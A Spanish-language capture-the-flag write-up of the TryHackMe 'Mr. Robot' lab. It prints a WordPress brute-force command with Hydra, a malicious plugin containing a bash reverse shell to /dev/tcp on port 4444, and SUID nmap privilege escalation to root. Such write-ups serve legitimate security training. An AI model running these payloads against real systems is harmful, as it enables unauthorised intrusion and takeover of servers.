# Mr. Robot — Writeup

**Plataforma:** TryHackMe  
**Dificultad:** Media  
**OS:** Linux  
**Técnicas:** Web enumeration, WordPress brute force, malicious plugin, SUID privesc

---

## Reconocimiento

### Nmap

```bash
nmap -sS -sC -sV -Pn 10.129.167.131
```

Resultados:

- Puerto 22 — SSH (abierto)
- Puerto 80 — HTTP (cerrado en escaneo pero accesible)
- Puerto 443 — HTTPS (cerrado en escaneo pero accesible)

### Enumeración web — Gobuster

```bash
gobuster dir -u http://10.129.167.131 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 50
```

![Gobuster output](TryHackMe/Mr-Robot-CTF/assets/1.png)

Resultados relevantes:

| Ruta            | Status | Notar                   |
| --------------- | ------ | ----------------------- |
| `/robots.txt`   | 200    | Contiene rutas ocultas  |
| `/wp-login.php` | 200    | Login de WordPress      |
| `/wp-admin`     | 301    | Panel de administración |
| `/readme`       | 200    | Mensaje sin info útil   |
| `/.htpasswd`    | 403    | Forbidden               |

---

## Key 1

`/robots.txt` revela dos entradas:

![robots.txt](TryHackMe/Mr-Robot-CTF/assets/2.png)

```
key-1-of-3.txt
fsocity.dic
```

Accediendo a `http://10.129.167.131/key-1-of-3.txt` → **primera key obtenida**.

`fsocity.dic` es una wordlist con más de 800.000 entradas (con muchos duplicados). La descargamos para uso posterior:

```bash
# Eliminar duplicados para reducir el tamaño
sort -u fsocity.dic > dic_clean.txt
```

---

## Acceso a WordPress

### Enumeración de usuario

WordPress revela si un usuario existe a través de mensajes de error diferentes:

- Usuario inexistente → `ERROR: Invalid username`
- Usuario correcto pero contraseña incorrecta → `ERROR: The password you entered for the username X is incorrect`

Probando `elliot` (personaje principal de la serie Mr. Robot) → el servidor confirma que el usuario existe.

![WordPress confirma usuario Elliot](TryHackMe/Mr-Robot-CTF/assets/3.png)

### Brute force con Hydra

Con el usuario confirmado, lanzamos Hydra contra el login de WordPress usando `fsocity.dic` como wordlist:

```bash
hydra -l elliot -P dic_clean.txt 10.129.167.131 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=incorrect" -V -t 16
```

> **Nota:** El path correcto es `/wp-login.php` (el `action` del form), no `/`. Los campos del form son `log` y `pwd` — verificado desde el código fuente de la página.

Contraseña obtenida: `ER28-0652`

![Hydra encuentra la contraseña](TryHackMe/Mr-Robot-CTF/assets/4.png)

---

## Shell inicial — WordPress Malicious Plugin

Con acceso al panel de administración de WordPress (`/wp-admin`), aprovechamos la funcionalidad de subida de plugins para ejecutar código PHP en el servidor.

![Panel WordPress con usuarios](TryHackMe/Mr-Robot-CTF/assets/5.png)

### Crear el payload

Creamos un archivo PHP con una reverse shell en bash:

![Creación shell.php](TryHackMe/Mr-Robot-CTF/assets/6.png)

```bash
cat > shell.php << 'EOF'
<?php
/**
 * Plugin Name: Shell
 */
exec("/bin/bash -c 'bash -i >& /dev/tcp/TU_IP/4444 0>&1'");
EOF
```

Alternativamente, desde el **Theme Editor** (`Appearance → Theme Editor`) editando un archivo PHP existente como `404.php` con el mismo payload.

### Subir y activar

WordPress solo acepta plugins en formato ZIP:

```bash
zip shell.zip shell.php
```

`Plugins` → `Add New` → `Upload Plugin` → subir `shell.zip` → `Install Now`

Antes de activar, ponemos Netcat a escuchar:

```bash
nc -lvnp 4444
```

Al activar el plugin → **reverse shell recibida como `daemon`**.

### Estabilizar la shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

---

## Key 2 — Escalada a usuario `robot`

En `/home/robot` encontramos dos archivos:

![Shell como daemon, permiso denegado](assets/7.png)

![Permisos de archivos en /home/robot](assets/8.png)

- `key-2-of-3.txt` — permiso denegado (propietario: `robot`)
- `password.raw-md5` — hash MD5 de la contraseña de `robot`

### Enumerar SUID

```bash
find / -perm -4000 2>/dev/null
```

Resultado relevante: `/usr/local/bin/nmap` tiene el bit SUID activado.

![SUID binaries](assets/9.png)

### Privesc con Nmap interactivo

Versiones antiguas de Nmap (3.x-5.x) incluyen modo interactivo que permite ejecutar comandos como el propietario del binario (root):

```bash
nmap --interactive
!sh
```

```bash
whoami
# root
```

![whoami root](assets/10.png)

### Alternativa (sin SUID)

Crackear el MD5 de `password.raw-md5` con John o Hashcat para obtener la contraseña de `robot` y hacer `su robot`.

---

## Key 3 — Root

Con acceso root:

```bash
cat /home/robot/key-2-of-3.txt   # Key 2
cat /root/key-3-of-3.txt         # Key 3
```

---

## Resumen de técnicas

|Fase|Técnica|
|---|---|
|Reconocimiento|Nmap, Gobuster|
|Info disclosure|robots.txt expone archivos sensibles|
|User enumeration|WordPress error messages|
|Brute force|Hydra + http-post-form|
|Acceso inicial|WordPress malicious plugin (reverse shell PHP)|
|Privesc|SUID nmap → shell interactiva como root|

---

## Lecciones aprendidas

> WordPress con credenciales débiles + panel de admin accesible = RCE garantizado. La subida de plugins es básicamente ejecución de código arbitrario si tienes acceso de admin.

> El SUID en `nmap` es un vector clásico de privesc — cualquier binario con SUID que no debería tenerlo es un vector potencial. Consultar [GTFOBins](https://gtfobins.github.io/) para exploits de binarios SUID.

> `robots.txt` nunca debe usarse para "ocultar" rutas sensibles — es público por definición y los scanners lo leen automáticamente.

> Reducir wordlists con `sort -u` antes de un brute force puede reducir el tiempo de 5 horas a 5 minutos.